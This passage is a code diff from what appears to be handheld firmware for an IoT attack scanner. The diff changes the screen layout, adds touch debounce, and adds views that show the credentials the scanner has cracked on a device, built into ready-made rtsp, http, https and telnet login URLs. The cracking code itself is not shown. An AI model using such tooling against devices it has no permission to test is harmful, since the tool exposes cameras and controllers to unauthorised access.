+    int row2Y = badgeY + badgeH + 2;
+    int badgeW2 = (SCREEN_WIDTH - 10 - gap * 2) / 3;  // ~74px each
+
+    drawStatBadge(5,                          row2Y, badgeW2, badgeH, "MQTT", (int)mqttFound,    HALEHOUND_CYAN);
+    drawStatBadge(5 + (badgeW2 + gap),        row2Y, badgeW2, badgeH, "Tel",  (int)telnetFound,  HALEHOUND_VIOLET);
+    drawStatBadge(5 + (badgeW2 + gap) * 2,    row2Y, badgeW2, badgeH, "Mod",  (int)modbusFound,  HALEHOUND_MAGENTA);
+
+    // ── Bottom gradient divider (into kill feed) ──
+    int divY2 = row2Y + badgeH + 2;
+    for (int gx = 0; gx < SCREEN_WIDTH; gx++)
+        tft.drawFastVLine(gx, divY2, 1, iotGradient((float)gx / SCREEN_WIDTH));
 }
 
 // =============================================================================
@@ -1833,16 +2232,13 @@ static void drawKillFeed() {
     if (!killFeedDirty) return;
     killFeedDirty = false;
 
-    int feedY = SCALE_Y(120);
+    int feedY = SCALE_Y(125);
     int feedH = SCALE_Y(290) - feedY;
     int lineH = 12;
     int maxLines = feedH / lineH;
 
     // Clear feed area
     tft.fillRect(0, feedY, SCREEN_WIDTH, feedH, HALEHOUND_BLACK);
-
-    // Draw separator
-    tft.drawLine(0, feedY - 1, SCREEN_WIDTH, feedY - 1, HALEHOUND_HOTPINK);
 
     int startIdx = killFeedScroll;
     if (startIdx + maxLines > killFeedCount) {
@@ -1951,7 +2347,7 @@ static void drawDetailView(int idx) {
         }
     }
 
-    // Credentials
+    // Credentials + access URLs
     if (dev.status == IOT_CRACKED) {
         tft.setCursor(5, SCALE_Y(130));
         tft.setTextColor(HALEHOUND_HOTPINK);
@@ -1959,10 +2355,35 @@ static void drawDetailView(int idx) {
         tft.setCursor(5, SCALE_Y(145));
         tft.printf("Pass: %s", dev.credPass);
 
+        int urlY = SCALE_Y(165);
+        tft.setTextColor(HALEHOUND_GREEN);
+        tft.setTextSize(1);
+
         if (dev.openPorts & 0x01) {
-            tft.setCursor(5, SCALE_Y(165));
-            tft.setTextColor(HALEHOUND_GREEN);
+            tft.setCursor(5, urlY);
             tft.printf("rtsp://%s:%s@%s:554/", dev.credUser, dev.credPass, ipStr);
+            urlY += SCALE_H(15);
+        }
+        if (dev.openPorts & 0x02) {
+            tft.setCursor(5, urlY);
+            tft.printf("http://%s:%s@%s/", dev.credUser, dev.credPass, ipStr);
+            urlY += SCALE_H(15);
+        }
+        if (dev.openPorts & 0x04) {
+            tft.setCursor(5, urlY);
+            tft.printf("http://%s:%s@%s:8080/", dev.credUser, dev.credPass, ipStr);
+            urlY += SCALE_H(15);
+        }
+        if (dev.openPorts & 0x40) {
+            tft.setCursor(5, urlY);
+            tft.printf("https://%s:%s@%s/", dev.credUser, dev.credPass, ipStr);
+            urlY += SCALE_H(15);
+        }
+        if (dev.openPorts & 0x08) {
+            tft.setCursor(5, urlY);
+            tft.setTextColor(HALEHOUND_CYAN);
+            tft.printf("telnet %s  %s:%s", ipStr, dev.credUser, dev.credPass);
+            urlY += SCALE_H(15);
         }
     }
 
@@ -1972,6 +2393,8 @@ static void drawDetailView(int idx) {
         tft.setTextColor(HALEHOUND_GREEN);
         tft.printf("Auth: NONE (open broker)");
         tft.setCursor(5, SCALE_Y(145));
+        tft.printf("mqtt://%s:1883/", ipStr);
+        tft.setCursor(5, SCALE_Y(160));
         tft.printf("Topics captured: %d", dev.mqttTopics);
     }
 
@@ -2080,7 +2503,7 @@ static void handleScanScreenTouch(int x, int y) {
     }
 
     // Kill feed area — tap on a line to see device detail
-    int feedY = SCALE_Y(120);
+    int feedY = SCALE_Y(125);
     int feedH = SCALE_Y(290) - feedY;
     int lineH = 12;
     int maxLines = feedH / lineH;
@@ -2124,7 +2547,7 @@ static void handleScanScreenTouch(int x, int y) {
     }
     if (y >= btnBarY && x >= SCALE_X(50) && x < SCALE_X(100)) {
         // Scroll DOWN (see newer messages)
-        int feedH = SCALE_Y(290) - SCALE_Y(120);
+        int feedH = SCALE_Y(290) - SCALE_Y(125);
         int maxLines = feedH / 12;
         if (killFeedCount > maxLines && killFeedScroll < killFeedCount - maxLines) {
             killFeedScroll++;
@@ -2194,6 +2617,7 @@ void setup() {
     scanStartTime = 0;
     sdReady = false;
     autoSaved = false;
+    lastTouchTime = 0;
 
     memset(devices, 0, sizeof(devices));
     memset(killFeed, 0, sizeof(killFeed));
@@ -2225,6 +2649,11 @@ void loop() {
     uint16_t tx, ty;
     bool touched = getTouchPoint(&tx, &ty);
 
+    // Debounce — ignore touches within 150ms of last processed touch
+    if (touched && (millis() - lastTouchTime < IOT_DEBOUNCE_MS)) {
+        touched = false;
+    }
+
     // Boot button = instant exit
     if (digitalRead(0) == LOW) {
         exitRequested = true;
@@ -2236,29 +2665,34 @@ void loop() {
         case IOT_SCR_WIFI_SCAN:
             // Back icon
             if (touched && ty >= (ICON_BAR_Y - 2) && ty <= (ICON_BAR_BOTTOM + 4) && tx >= 5 && tx <= 30) {
+                lastTouchTime = millis();
                 exitRequested = true;
                 waitForTouchRelease();
                 return;
             }
             if (touched) {
+                lastTouchTime = millis();
                 handleWifiScanTouch(tx, ty);
             }
             break;
 
         case IOT_SCR_CREDS:
             if (touched) {
+                lastTouchTime = millis();
                 handleCredsTouch(tx, ty);
             }
             break;
 
         case IOT_SCR_KEYBOARD_SSID:
             if (touched) {
+                lastTouchTime = millis();
                 handleKeyboardTouch(tx, ty, 32);
             }
             break;
 
         case IOT_SCR_KEYBOARD_PASS:
             if (touched) {
+                lastTouchTime = millis();
                 handleKeyboardTouch(tx, ty, 64);
             }
             break;
@@ -2322,6 +2756,7 @@ void loop() {
 
             // Touch handling
             if (touched) {
+                lastTouchTime = millis();
                 handleScanScreenTouch(tx, ty);
             }
 
@@ -2345,6 +2780,7 @@ void loop() {
 
         case IOT_SCR_DETAIL:
             if (touched) {
+                lastTouchTime = millis();
                 // Any tap on back icon or boot button returns to scan
                 if ((ty >= (ICON_BAR_Y - 2) && ty <= (ICON_BAR_BOTTOM + 4) && tx >= 5 && tx <= 30) ||
                     buttonPressed(BTN_BACK)) {
